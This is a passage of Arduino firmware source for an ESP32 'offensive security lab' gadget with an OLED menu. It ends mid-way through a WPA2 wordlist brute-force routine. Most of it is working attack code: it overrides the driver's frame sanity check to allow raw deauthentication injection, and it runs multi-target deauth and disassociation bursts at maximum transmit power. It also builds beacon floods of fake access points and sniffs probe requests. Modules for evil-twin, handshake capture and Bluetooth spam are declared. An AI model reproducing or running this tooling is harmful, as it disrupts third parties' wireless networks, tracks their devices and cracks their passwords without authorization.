/*
 * ╔══════════════════════════════════════════════════════════════╗
 * ║      ESP32 Offensive Security Lab — v3.0                    ║
 * ║      Hardware: ESP32-WROOM-32 + SSD1306 0.96" OLED (I2C)   ║
 * ║      Navigation: BOOT button (GPIO0)                        ║
 * ║      For authorized lab / university research ONLY          ║
 * ╚══════════════════════════════════════════════════════════════╝
 *
 *  MODULES:
 *   • Wi-Fi Recon    — passive scan
 *   • Deauth Attack  — 802.11 deauthentication frames
 *   • Beacon Flood   — fake SSID injection
 *   • Probe Sniffer  — capture hidden device fingerprints
 *   • BLE Scanner    — enumerate nearby BLE devices
 *   • BLE Spam       — Apple / Android / Windows adv flood
 *   • Evil Twin      — open AP clone
 *   • EAPOL Sniffer  — WPA handshake capture
 *
 *  OLED Navigation (GPIO0 / BOOT button):
 *   • Short press  (< 600 ms) — next menu item  /  back to main
 *   • Long press   (≥ 600 ms) — select / start / stop (fires on threshold, not release)
 */

// ─────────────────────────────────────────────────────────────
//  Includes
// ─────────────────────────────────────────────────────────────
#include <Arduino.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncJson.h>
#include <ArduinoJson.h>
#include <LittleFS.h>
#include <Preferences.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "tcpip_adapter.h"
#include "esp_bt.h"        // esp_bt_controller_enable/disable
#include "esp_bt_main.h"   // esp_bluedroid_enable/disable
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>

// ─────────────────────────────────────────────────────────────
//  Config
// ─────────────────────────────────────────────────────────────

// ── OLED ─────────────────────────────────────────────────────
#define OLED_W      128
#define OLED_H       64
#define OLED_ADDR  0x3C     // Try 0x3D if display stays blank
#define SDA_PIN       5     // IdeaSpark ESP32 0.96" OLED board
#define SCL_PIN       4     // IdeaSpark ESP32 0.96" OLED board
#define OLED_RST     -1     // No dedicated reset on IdeaSpark

// Many cheap 0.96" SSD1306 panels are physically dual-colour:
// top 16 px = YELLOW, bottom 48 px = BLUE. We USE the full screen now:
// header sits in the yellow band (eye-catching), menu/content in the blue.
#define UI_TOP        0     // Use full screen height

// ── Button (BOOT = GPIO0, active LOW, internal pull-up) ──────
#define BTN_PIN         0
#define LONG_PRESS_MS 600
#define DEBOUNCE_MS    40

// ── AP / Web ─────────────────────────────────────────────────
#define DEFAULT_AP_SSID   "ESP32-SecurityLab"
#define DEFAULT_AP_PASS   "lab12345"
#define AP_CHANNEL        6
#define HTTP_PORT         80
#define MAX_LOG_ENTRIES   100
#define MAX_PROBES        60
#define MAX_BLE_RESULTS   60

// Session token — hardware RNG at boot, RAM only
String g_sessionToken;

static const IPAddress AP_IP(192, 168, 4, 1);
static const IPAddress AP_GW(192, 168, 4, 1);
static const IPAddress AP_SN(255, 255, 255, 0);

// Forward declarations
void stopDeauth();
void stopBeaconFlood();
void stopBLESpam();
void stopEvilTwin();
void stopEapolSniffer();
void stopProbeSniffer();
void stopBruteForce();

// ─────────────────────────────────────────────────────────────
//  ████  DEFINITIVE FIX: ESP-IDF raw-frame sanity-check bypass ████
// ─────────────────────────────────────────────────────────────
// ESP-IDF's WiFi driver calls `ieee80211_raw_frame_sanity_check()` before
// every `esp_wifi_80211_tx()`. The default implementation REJECTS
// management frames like Deauth (0xC0) and Disassoc (0xA0), printing
// "unsupport frame type: 0c0/0a0" and dropping the frame.
//
// By providing our own definition with `extern "C"` weak-override semantics,
// the linker uses OUR version instead. Returning 0 = "frame is fine, send it".
//
// This is THE fix used by every working ESP32 deauther (ESP32-Marauder,
// SpaceHuhn Deauther, ESP32-WiFi-Hash-Monster, the watch in the picture).
// Without this, raw deauth/disassoc injection is IMPOSSIBLE on ESP32.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (arg == 31337) return 1;  // signature so linker picks our version
    return 0;                     // accept all frame types
}

// ─────────────────────────────────────────────────────────────
//  802.11 Frame Structures
// ─────────────────────────────────────────────────────────────
typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t  dst[6];
    uint8_t  src[6];
    uint8_t  bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason;
} __attribute__((packed)) DeauthFrame;

typedef struct {
    uint16_t frame_ctrl;
    uint16_t duration;
    uint8_t  dst[6];
    uint8_t  src[6];
    uint8_t  bssid[6];
    uint16_t seq_ctrl;
} __attribute__((packed)) Ieee80211Hdr;

// ─────────────────────────────────────────────────────────────
//  Data Types
// ─────────────────────────────────────────────────────────────
struct LogEntry  { unsigned long ms; String lvl; String msg; };
struct ProbeEntry{ char mac[18]; char ssid[33]; int8_t rssi; unsigned long ts; };
struct BLEResult { String addr; String name; int rssi; String type; };

// ─────────────────────────────────────────────────────────────
//  OLED Object + Menu State
// ─────────────────────────────────────────────────────────────
Adafruit_SSD1306 oled(OLED_W, OLED_H, &Wire, OLED_RST);

enum Screen : uint8_t {
    SCR_MAIN = 0,
    SCR_WIFI_MENU,       // WiFi sub-menu
    SCR_BLE_MENU,        // BLE sub-menu
    SCR_WIFI_SCAN,
    SCR_WIFI_LIST,       // scrollable AP list — long-press toggles selection
    SCR_DEAUTH,
    SCR_BEACON,
    SCR_BEACON_COUNT,    // cycle through 5/10/20/50/100 fake APs
    SCR_PROBE,
    SCR_BRUTE,           // brute-force progress screen
    SCR_BLE_SCAN,
    SCR_BLE_LIST,        // scrollable device list shown after BLE scan
    SCR_BLE_SPAM,
    SCR_BLE_TARGET,      // cycle All / iPhone / Android / Windows
    SCR_SYSINFO
};

// ── Top-level menu (3 items — fits on one screen) ────────────
static const char* MAIN_ITEMS[] = {
    "WiFi >",       // 0 — enter WiFi sub-menu
    "Bluetooth >",  // 1 — enter BLE sub-menu
    "System Info"   // 2
};
static const int MAIN_ITEMS_N = 3;

// ── WiFi sub-menu ─────────────────────────────────────────────
static const char* WIFI_MENU_ITEMS[] = {
    "WiFi Scan",    // 0 — scan → build AP selection list
    "WiFi Death",   // 1 — deauth selected APs (or broadcast)
    "WiFi Brute",   // 2 — brute-force PSK against selected AP
    "Beacon Flood", // 3
    "Beacon Count", // 4
    "Probe Sniffer",// 5
    "<< Back"       // 6
};
static const int WIFI_MENU_N = 7;

// ── BLE sub-menu ──────────────────────────────────────────────
static const char* BLE_MENU_ITEMS[] = {
    "BLE Scan",    // 0
    "BLE Spam",    // 1
    "Spam Target", // 2
    "<< Back"      // 3
};
static const int BLE_MENU_N = 4;

Screen g_screen     = SCR_MAIN;
int    g_menuSel    = 0;
int    g_menuScroll = 0;
// Sub-menu cursor state
int    g_wifiMenuSel    = 0;
int    g_wifiMenuScroll = 0;
int    g_bleMenuSel     = 0;
int    g_bleMenuScroll  = 0;

// Button state
static bool          btnWasDown   = false;
static unsigned long btnDownAt    = 0;
static bool          btnLongFired = false;

// Set true whenever state changes to force an immediate OLED repaint
volatile bool g_oledDirty = true;

// ── WiFi scan results captured for the OLED list view ──────
struct WifiAP {
    char    ssid[33];
    uint8_t bssid[6];
    uint8_t channel;
    int8_t  rssi;
    bool    selected;   // multi-select for kill list
};
#define MAX_APS 30
WifiAP g_aps[MAX_APS];
int    g_apCount    = 0;
int    g_apSelected = 0;  // cursor position
int    g_apScroll   = 0;

// ── BLE scan list cursor ─────────────────────────────────
int g_bleSelected = 0;
int g_bleScroll   = 0;

// ── Beacon AP count selector ─────────────────────────────
static const int  BEACON_COUNTS[]   = {50, 100, 200, 500, 1000, 0};  // 0 = infinite
static const int  BEACON_COUNTS_N   = 6;
int               g_beaconCountIdx  = 5;   // default INF (index 5 = 0 = continuous)

// ── Spam target selector ─────────────────────────────────
enum SpamTarget : uint8_t { TGT_ALL = 0, TGT_APPLE, TGT_ANDROID, TGT_WINDOWS };
SpamTarget g_spamTarget = TGT_ALL;
static const char* SPAM_TARGET_NAMES[] = {"All", "iPhone", "Android", "Windows"};

// ─────────────────────────────────────────────────────────────
//  Global State
// ─────────────────────────────────────────────────────────────
AsyncWebServer server(HTTP_PORT);
Preferences    prefs;

String g_apSSID, g_apPass;

std::vector<LogEntry> g_logs;

// Wi-Fi scan
volatile bool g_scanRunning = false;
String        g_scanJson    = R"({"networks":[],"count":0,"status":"idle"})";

// Deauth — supports single target OR multi-target rotation
#define MAX_DEAUTH_TARGETS 20
struct {
    bool     active    = false;
    uint8_t  bssid[6]  = {};
    uint8_t  target[6] = {};
    uint8_t  channel   = 1;
    uint32_t sent      = 0;
    uint32_t goal      = 0;        // 0 = continuous
    // Multi-target mode: cycle through these BSSIDs, hopping channels
    bool     multiMode = false;
    int      multiCount = 0;
    uint8_t  multiBssids[MAX_DEAUTH_TARGETS][6];
    uint8_t  multiChannels[MAX_DEAUTH_TARGETS];
} g_deauth;
TaskHandle_t g_deauthTask = nullptr;

// Beacon flood
struct {
    bool    active  = false;
    int     count   = 0;
    int     sent    = 0;
    uint8_t channel = 6;
    char    ssid[33]= {};
} g_beacon;
TaskHandle_t g_beaconTask = nullptr;

// Probe sniffer
volatile bool g_probeActive = false;
ProbeEntry    g_probes[MAX_PROBES];
volatile int  g_probeCount  = 0;
portMUX_TYPE  g_probeMux    = portMUX_INITIALIZER_UNLOCKED;

// BLE
volatile bool          g_bleScanActive = false;
volatile bool          g_bleSpamActive = false;
std::vector<BLEResult> g_bleResults;
BLEScan*               g_bleScan       = nullptr;
TaskHandle_t           g_bleSpamTask   = nullptr;
String                 g_bleSpamType   = "apple";
struct { bool apple=true; bool android=true; bool windows=true; } g_bleSpamPlatforms;

// Radio arbitration (BLE ↔ WiFi scan)
volatile bool g_bleReady     = true;
TaskHandle_t  g_wifiScanTask = nullptr;

// Evil Twin
struct {
    bool   active = false;
    uint8_t channel = 6;
    String targetSSID;
    String origSSID;
    String origPass;
} g_evilTwin;

// EAPOL sniffer
struct EapolEntry { char bssid[18]; char client[18]; unsigned long ts; };
#define MAX_EAPOL 20
EapolEntry    g_eapolFrames[MAX_EAPOL];
volatile int  g_eapolCount  = 0;
volatile bool g_eapolActive = false;
portMUX_TYPE  g_eapolMux    = portMUX_INITIALIZER_UNLOCKED;

// ── WiFi Brute-Force ─────────────────────────────────────
struct {
    bool     active     = false;
    char     ssid[33]   = {};
    char     wordlist[24]  = "/wordlist.txt";   // path in LittleFS
    uint32_t tried      = 0;
    uint32_t total      = 0;
    uint32_t perPwdMs   = 4000;                 // timeout per password attempt
    bool     found      = false;
    char     foundPwd[64]= {};
    char     curPwd[64] = {};                   // currently trying
} g_brute;
TaskHandle_t g_bruteTask = nullptr;

// ─────────────────────────────────────────────────────────────
//  Logging
// ─────────────────────────────────────────────────────────────
void logAdd(const String& msg, const String& lvl = "INFO") {
    if (g_logs.size() >= MAX_LOG_ENTRIES) g_logs.erase(g_logs.begin());
    g_logs.push_back({ millis(), lvl, msg });
    Serial.printf("[%s] %s\n", lvl.c_str(), msg.c_str());
}

static String fmtUptime(unsigned long ms) {
    unsigned long s = ms/1000, m = s/60, h = m/60;
    char b[24]; snprintf(b, sizeof(b), "%02luh %02lum %02lus", h, m%60, s%60);
    return String(b);
}

// ─────────────────────────────────────────────────────────────
//  Session Token
// ─────────────────────────────────────────────────────────────
static String generateSessionToken() {
    char buf[33];
    for (int i = 0; i < 8; i++) snprintf(&buf[i*4], 5, "%08x", (unsigned)esp_random());
    buf[32] = '\0';
    return String(buf);
}

static String parseCookie(const String& header, const String& name) {
    String prefix = name + "=";
    int pos = 0;
    while (pos < (int)header.length()) {
        while (pos < (int)header.length() && header[pos] == ' ') pos++;
        int semi = header.indexOf(';', pos);
        String pair = (semi < 0) ? header.substring(pos) : header.substring(pos, semi);
        pair.trim();
        if (pair.startsWith(prefix) && pair.length() > prefix.length())
            return pair.substring(prefix.length());
        if (semi < 0) break;
        pos = semi + 1;
    }
    return "";
}

static bool safeEquals(const String& a, const String& b) {
    if (a.length() != b.length() || a.length() == 0) return false;
    uint8_t diff = 0;
    for (size_t i = 0; i < a.length(); i++) diff |= (uint8_t)(a[i] ^ b[i]);
    return diff == 0;
}

// ─────────────────────────────────────────────────────────────
//  MAC Helpers
// ─────────────────────────────────────────────────────────────
void parseMac(const char* s, uint8_t* out) {
    if (!s || strlen(s) < 17) { memset(out, 0, 6); return; }
    int n = sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &out[0],&out[1],&out[2],&out[3],&out[4],&out[5]);
    if (n != 6) memset(out, 0, 6);
}
String macStr(const uint8_t* m) {
    char b[18];
    snprintf(b,sizeof(b),"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
    return String(b);
}
void randMac(uint8_t* m) {
    for (int i=0;i<6;i++) m[i]=random(0,256);
    m[0] &= 0xFE; m[0] |= 0x02;
}

// ─────────────────────────────────────────────────────────────
//  ████  DEAUTH ATTACK  ████
// ─────────────────────────────────────────────────────────────
// type: 0xC0 = Deauthentication, 0xA0 = Disassociation
// seq: global sequence counter — increments per frame so receivers don't treat
//      repeated frames as duplicates (802.11 duplicate-detection uses seq_ctrl)
static uint16_t g_deauthSeq = 0;
static void buildDeauth(uint8_t* buf, uint8_t* dst, uint8_t* src, uint8_t* bssid,
                        uint16_t type = 0x00C0) {
    DeauthFrame* f = (DeauthFrame*)buf;
    f->frame_ctrl = type;
    f->duration   = 0x013A;
    // 802.11 seq_ctrl: bits 15:4 = sequence number, bits 3:0 = fragment number
    f->seq_ctrl   = (g_deauthSeq++ & 0x0FFF) << 4;
    f->reason     = 7;
    memcpy(f->dst, dst, 6); memcpy(f->src, src, 6); memcpy(f->bssid, bssid, 6);
}

// ── DEFINITIVE deauth recipe (Marauder/Deauther style) ──────────
// 1. Promiscuous mode = true → pauses AP beacon scheduler so radio stays on
//    the chosen channel (the AP beacon was pulling radio back to AP_CHANNEL,
//    which is why frames never reached targets on other channels).
// 2. esp_wifi_set_channel(target_ch) → radio locked to target's channel.
// 3. esp_wifi_80211_tx(WIFI_IF_AP, ..., en_sys_seq=false):
//    - WIFI_IF_AP: most reliable interface for raw injection (always "up").
//    - en_sys_seq=false: bypasses driver's mgmt-frame filter (no
//      "unsupport frame type" errors).
// 4. After attack: disable promiscuous + restore AP_CHANNEL → dashboard
//    reconnects on its original channel.
// Track tx success / failure counts for diagnostics
static uint32_t g_txOkCount  = 0;
static uint32_t g_txErrCount = 0;
static esp_err_t g_lastTxErr = ESP_OK;

static inline void txDeauth(uint8_t* buf) {
    // WIFI_IF_AP + en_sys_seq=false = proven raw injection path.
    esp_err_t r = esp_wifi_80211_tx(WIFI_IF_AP, buf, sizeof(DeauthFrame), false);
    if (r == ESP_OK) g_txOkCount++;
    else { g_txErrCount++; g_lastTxErr = r; }
}

void deauthTaskFn(void*) {
    static uint8_t buf[sizeof(DeauthFrame)];
    uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    // Reset diagnostic counters
    g_txOkCount = 0; g_txErrCount = 0; g_lastTxErr = ESP_OK;

    // Max TX power for attack range
    esp_wifi_set_max_tx_power(78);  // 19.5 dBm

    // ── STEP 1: Disable other promiscuous consumers ──────────────
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    // ── STEP 1b: KILL the AP completely during attack ────────────
    // Even in promiscuous mode, the AP beacon scheduler can fight for the
    // radio and keep pulling it back to AP_CHANNEL (=6). For a target on
    // ch 12 this is fatal — frames go out on ch 6 instead.
    // Using raw esp_wifi_set_mode() (not WiFi.softAP) to avoid the
    // xQueueGenericSend assert that hit us from Core 0 before.
    // Dashboard disconnects during attack — accepted trade-off, OLED still works.
    wifi_mode_t savedMode = WIFI_MODE_APSTA;
    esp_wifi_get_mode(&savedMode);
    esp_wifi_set_mode(WIFI_MODE_STA);   // radio fully on STA, no AP beacon
    vTaskDelay(pdMS_TO_TICKS(100));     // let AP teardown settle

    // ── STEP 2: Enter promiscuous mode for raw injection ─────────
    esp_err_t pErr = esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filt);
    logAdd("Deauth: AP_OFF promisc="+String(pErr==ESP_OK?"OK":"FAIL"));

    // ── STEP 3: Lock radio to initial target channel ─────────────
    uint8_t initCh = g_deauth.multiMode ? g_deauth.multiChannels[0] : g_deauth.channel;
    esp_err_t cErr = esp_wifi_set_channel(initCh, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(50));  // let PHY settle

    // Verify actual channel
    uint8_t actualCh = 0;
    wifi_second_chan_t sc;
    esp_wifi_get_channel(&actualCh, &sc);
    logAdd("Deauth: requested ch="+String(initCh)+" actual ch="+String(actualCh)+
           " setCh="+String(cErr==ESP_OK?"OK":"FAIL"), "WARN");

    // Log target BSSID + target MAC so user can verify these are correct
    auto macStr = [](uint8_t* m) {
        char b[18]; snprintf(b,18,"%02X:%02X:%02X:%02X:%02X:%02X",
                             m[0],m[1],m[2],m[3],m[4],m[5]);
        return String(b);
    };
    if (g_deauth.multiMode) {
        for (int i = 0; i < g_deauth.multiCount; i++) {
            logAdd("Target #"+String(i)+": BSSID="+macStr(g_deauth.multiBssids[i])+
                   " ch="+String(g_deauth.multiChannels[i]), "WARN");
        }
    } else {
        logAdd("Target: BSSID="+macStr(g_deauth.bssid)+
               " MAC="+macStr(g_deauth.target)+" ch="+String(g_deauth.channel), "WARN");
    }

    uint32_t lastLog = millis();

    int      idx   = 0;
    uint8_t  curCh = initCh;
    while (g_deauth.active) {
        uint8_t* bssid;
        uint8_t* target;
        if (g_deauth.multiMode) {
            int i  = idx % g_deauth.multiCount;
            bssid  = g_deauth.multiBssids[i];
            target = bcast;
            uint8_t ch = g_deauth.multiChannels[i];
            if (ch != curCh) {
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
                curCh = ch;
                vTaskDelay(pdMS_TO_TICKS(10));  // tiny settle
            }
            idx++;
        } else {
            bssid  = g_deauth.bssid;
            target = g_deauth.target;
        }

        // ── 6-frame burst: deauth+disassoc × (bcast + target + reverse) ──
        // Reason 7 = "Class 3 frame from non-associated STA" (Marauder default).
        // Reverse direction (AP→client appearing to come from client) catches
        // some clients that ignore frames not directed to them.
        // Tiny delay between frames so TX queue isn't exhausted (ESP_ERR_NO_MEM 0x101).
        buildDeauth(buf, bcast,  bssid,  bssid, 0x00C0); txDeauth(buf); delayMicroseconds(500);
        buildDeauth(buf, target, bssid,  bssid, 0x00C0); txDeauth(buf); delayMicroseconds(500);
        buildDeauth(buf, bssid,  target, bssid, 0x00C0); txDeauth(buf); delayMicroseconds(500);
        buildDeauth(buf, bcast,  bssid,  bssid, 0x00A0); txDeauth(buf); delayMicroseconds(500);
        buildDeauth(buf, target, bssid,  bssid, 0x00A0); txDeauth(buf); delayMicroseconds(500);
        buildDeauth(buf, bssid,  target, bssid, 0x00A0); txDeauth(buf);

        g_deauth.sent++;

        // Periodic diagnostic log every 2 seconds so we can see TX is alive
        if (millis() - lastLog > 2000) {
            uint8_t nowCh; wifi_second_chan_t sc2;
            esp_wifi_get_channel(&nowCh, &sc2);
            logAdd("Deauth tx: ok="+String(g_txOkCount)+" err="+String(g_txErrCount)+
                   " lastErr=0x"+String(g_lastTxErr,HEX)+" ch="+String(nowCh));
            lastLog = millis();
        }

        if (g_deauth.goal > 0 && g_deauth.sent >= g_deauth.goal) g_deauth.active = false;
        vTaskDelay(1);  // yield to TWDT + AsyncTCP
    }

    // ── STEP 4: Cleanup — disable promiscuous + restore APSTA mode ─
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_max_tx_power(68);  // restore default 17 dBm

    // Restore APSTA mode so dashboard comes back
    esp_wifi_set_mode(savedMode);
    vTaskDelay(pdMS_TO_TICKS(200));  // let AP restart

    logAdd("Deauth ended: bursts="+String(g_deauth.sent)+" tx_ok="+String(g_txOkCount)+
           " tx_err="+String(g_txErrCount), "WARN");

    g_deauthTask = nullptr;
    vTaskDelete(nullptr);
}

void startDeauth(const char* bssid, const char* target, uint8_t ch, uint32_t count) {
    stopDeauth();
    parseMac(bssid,  g_deauth.bssid);
    parseMac(target, g_deauth.target);
    g_deauth.channel    = constrain(ch, 1, 14);
    g_deauth.sent       = 0;
    g_deauth.goal       = count;
    g_deauth.multiMode  = false;
    g_deauth.multiCount = 0;
    g_deauth.active     = true;
    xTaskCreatePinnedToCore(deauthTaskFn, "deauth", 8192, nullptr, 5, &g_deauthTask, 0);
    logAdd("Deauth started → " + String(bssid) + " ch" + ch, "WARN");
}

// Multi-target deauth: rotates through all APs the user selected on the OLED list
int startDeauthMulti() {
    stopDeauth();
    int n = 0;
    for (int i = 0; i < g_apCount && n < MAX_DEAUTH_TARGETS; i++) {
        if (g_aps[i].selected) {
            memcpy(g_deauth.multiBssids[n], g_aps[i].bssid, 6);
            g_deauth.multiChannels[n] = g_aps[i].channel;
            n++;
        }
    }
    if (n == 0) return 0;
    g_deauth.multiCount = n;
    g_deauth.multiMode  = true;
    g_deauth.sent       = 0;
    g_deauth.goal       = 0;
    g_deauth.channel    = g_deauth.multiChannels[0];
    g_deauth.active     = true;
    xTaskCreatePinnedToCore(deauthTaskFn, "deauthM", 8192, nullptr, 5, &g_deauthTask, 0);
    logAdd("Multi-deauth: " + String(n) + " targets", "WARN");
    return n;
}

void stopDeauth() {
    if (!g_deauth.active && !g_deauthTask) return;
    g_deauth.active = false;
    // Give the deauth task up to 200 ms to exit its while() loop cleanly.
    // Calling vTaskDelete() while the task is inside esp_wifi_80211_tx()
    // corrupts the heap allocator — cooperative shutdown avoids that.
    for (int i = 0; i < 20 && g_deauthTask != nullptr; i++)
        vTaskDelay(pdMS_TO_TICKS(10));
    if (g_deauthTask) { vTaskDelete(g_deauthTask); g_deauthTask = nullptr; }
    logAdd("Deauth stopped (sent: " + String(g_deauth.sent) + ")");
}

// ─────────────────────────────────────────────────────────────
//  ████  BEACON FLOOD  ████
// ─────────────────────────────────────────────────────────────
static const char* BEACON_NAMES[] = {
    "Free_WiFi","Starbucks","Airport_WiFi","Hotel_Guest",
    "OpenNetwork","AndroidShare","iPhone_Hotspot","FBI_Van",
    "NSA_Surveillance","Neighbor_5G","HackRF_Lab","Guest_Network",
    "Corp_Internal","IoT_Device","HomeNetwork_EXT","VPN_Server",
    "CloudFlare_AP","Hidden_Network","Lab_Secure","TestAP_DO_NOT_USE"
};

static void sendBeacon(const char* ssid, uint8_t* bssid, uint8_t ch) {
    // ── Static buffer: ZERO heap involvement ─────────────────────
    // Frame layout: 36 header + 2+ssid_len SSID IE + 10 Rates IE
    //               + 3 DS IE + 2 RSN IE = 53 + ssid_len (max 85 bytes).
    // Using 'static' (BSS) avoids:
    //  (1) malloc/free heap corruption when esp_wifi_80211_tx stack-overflows
    //  (2) repeated heap alloc/free fragmentation in the tight beacon loop
    //  (3) the original 1-byte off-by-one (52+ssid_len was allocated, 53 written)
    // beaconTaskFn is single-instance, so no concurrency issue with static.
    static uint8_t f[90];  // 53 + 32 max SSID + 5 safety margin = 90

    uint8_t ssid_len  = strnlen(ssid, 32);   // hard cap at 32
    uint8_t frame_len = 53 + ssid_len;

    memset(f, 0, frame_len);
    f[0]=0x80; f[1]=0x00; f[2]=0x00; f[3]=0x00;
    memset(&f[4], 0xFF, 6);
    memcpy(&f[10], bssid, 6); memcpy(&f[16], bssid, 6);
    f[22]=random(0,256); f[23]=random(0,256);
    f[32]=0x64; f[33]=0x00; f[34]=0x31; f[35]=0x04;
    uint8_t* p = &f[36];
    *p++=0x00; *p++=ssid_len; memcpy(p,ssid,ssid_len); p+=ssid_len;
    *p++=0x01; *p++=0x08;
    *p++=0x82; *p++=0x84; *p++=0x8B; *p++=0x96;
    *p++=0x24; *p++=0x30; *p++=0x48; *p++=0x6C;
    *p++=0x03; *p++=0x01; *p++=ch;
    *p++=0x30; *p++=0x00;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    esp_wifi_80211_tx(WIFI_IF_AP, f, frame_len, false);
    // No free() — static buffer, nothing to release
}

void beaconTaskFn(void*) {
    uint8_t fakeMac[6];
    // Default SSID: "#VOID TEST". Custom SSID can be set via web API.
    // Each beacon uses a different random BSSID — every packet appears as
    // a separate fake AP in any WiFi scanner.
    const char* basePrefix  = (g_beacon.ssid[0]) ? g_beacon.ssid : "#VOID TEST";
    int         totalToSend = g_beacon.count;   // 0 = infinite
    while (g_beacon.active) {
        if (totalToSend > 0 && g_beacon.sent >= totalToSend) { g_beacon.active=false; break; }
        randMac(fakeMac);
        char numberedSsid[33];
        snprintf(numberedSsid, sizeof(numberedSsid), "%s %d", basePrefix, g_beacon.sent + 1);
        sendBeacon(numberedSsid, fakeMac, g_beacon.channel);
        g_beacon.sent++; delay(5);
    }
    g_beaconTask = nullptr;
    logAdd("Beacon flood stopped (sent: " + String(g_beacon.sent) + ")");
    vTaskDelete(nullptr);
}

void startBeaconFlood(uint8_t ch, int count, const char* customSsid = nullptr) {
    stopBeaconFlood();
    g_beacon.channel = constrain(ch, 1, 14);
    g_beacon.count   = count;
    g_beacon.sent    = 0;
    g_beacon.ssid[0] = '\0';
    if (customSsid) {
        size_t len = strlen(customSsid);
        if (len > 0 && len <= 32) {
            bool safe = true;
            for (size_t i=0;i<len;i++) if((uint8_t)customSsid[i]<0x20||(uint8_t)customSsid[i]>0x7E){safe=false;break;}
            if (safe){ memcpy(g_beacon.ssid,customSsid,len); g_beacon.ssid[len]='\0'; }
        }
    }
    g_beacon.active = true;
    xTaskCreatePinnedToCore(beaconTaskFn,"beacon",8192,nullptr,4,&g_beaconTask,0);
    const char* logSsid = g_beacon.ssid[0] ? g_beacon.ssid : "#VOID TEST";
    String logCnt = (count == 0) ? "INF" : String(count);
    logAdd("Beacon flood started ch"+String(ch)+" ssid="+logSsid+" count="+logCnt, "WARN");
}

void stopBeaconFlood() {
    if (!g_beacon.active && !g_beaconTask) return;
    g_beacon.active = false;
    for (int i = 0; i < 20 && g_beaconTask != nullptr; i++)
        vTaskDelay(pdMS_TO_TICKS(10));
    if (g_beaconTask){ vTaskDelete(g_beaconTask); g_beaconTask=nullptr; }
}

// ─────────────────────────────────────────────────────────────
//  ████  PROBE SNIFFER  ████
// ─────────────────────────────────────────────────────────────
static void probeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    auto* hdr = (Ieee80211Hdr*)pkt->payload;
    if ((hdr->frame_ctrl & 0x00FC) != 0x0040) return;
    uint8_t* body    = pkt->payload + sizeof(Ieee80211Hdr);
    uint16_t bodyLen = pkt->rx_ctrl.sig_len - sizeof(Ieee80211Hdr);
    if (bodyLen < 2) return;
    char probedSSID[33]={};
    if (body[0]==0x00 && body[1]>0 && body[1]<=32) memcpy(probedSSID,&body[2],body[1]);
    else strcpy(probedSSID,"[Broadcast]");
    char mac[18];
    snprintf(mac,sizeof(mac),"%02X:%02X:%02X:%02X:%02X:%02X",
             hdr->src[0],hdr->src[1],hdr->src[2],hdr->src[3],hdr->src[4],hdr->src[5]);
    taskENTER_CRITICAL_ISR(&g_probeMux);
    if (g_probeCount < MAX_PROBES) {
        ProbeEntry& e = g_probes[g_probeCount];
        strncpy(e.mac,mac,17); e.mac[17]='\0';
        strncpy(e.ssid,probedSSID,32); e.ssid[32]='\0';
        e.rssi = pkt->rx_ctrl.rssi;
        e.ts   = millis();
        g_probeCount++;
    }
    taskEXIT_CRITICAL_ISR(&g_probeMux);
}

void startProbeSniffer() {
    g_probeCount=0; g_probeActive=true;
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(probeCallback);
    logAdd("Probe sniffer started","WARN");
}

void stopProbeSniffer() {
    g_probeActive=false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    logAdd("Probe sniffer stopped ("+String(g_probeCount)+" captured)");
}

// ─────────────────────────────────────────────────────────────
//  ████  WIFI BRUTE-FORCE  ████
// ─────────────────────────────────────────────────────────────
// Tries each password in a wordlist against the target SSID by calling
// WiFi.begin() and waiting up to perPwdMs for WL_CONNECTED. On success
// the password is stored in g_brute.foundPwd and the task exits.
//
// Notes / limitations:
//  - WiFi.begin() uses the STA interface. AP stays up because we are in
//    WIFI_AP_STA mode — dashboard remains reachable during attack.
//  - WPA2-PSK only. WPA3 SAE and WEP are not handled by WiFi.begin().
//  - Per-password floor is ~2-3 s due to 4-way-handshake timing; the
//    timeout below caps the worst case.

// Counts non-empty, non-comment lines in the wordlist
static uint32_t countWordlistLines(const char* path) {
    File f = LittleFS.open(path, "r");
    if (!f) return 0;
    uint32_t n = 0;
    while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() >= 8 && line.length() <= 63 && line[0] != '#') n++;
    }
    f.close();
    return n;
}

void bruteTaskFn(void*) {
    File f = LittleFS.open(g_brute.wordlist, "r");
    if (!f) {
        logAdd(String("Brute: wordlist not found: ") + g_brute.wordlist, "WARN");
        g_brute.active = false;
        g_bruteTask    = nullptr;
        vTaskDelete(nullptr);
        return;
    }
    logAdd(String("Brute started → ") + g_brute.ssid +
           " (" + String(g_brute.total) + " passwords)", "WARN");

    WiFi.disconnect(true, true);
    vTaskDelay(pdMS_TO_TICKS(150));

    while (g_brute.active && f.available()) {
        String line = f.readStringUntil('\n');
        line.trim();
        if (line.length() < 8 || line.length() > 63 || line[0] == '#') continue;

        strncpy(g_brute.curPwd, line.c_str(), 63);
        g_brute.curPwd[63] = '\0';
        g_brute.tried++;

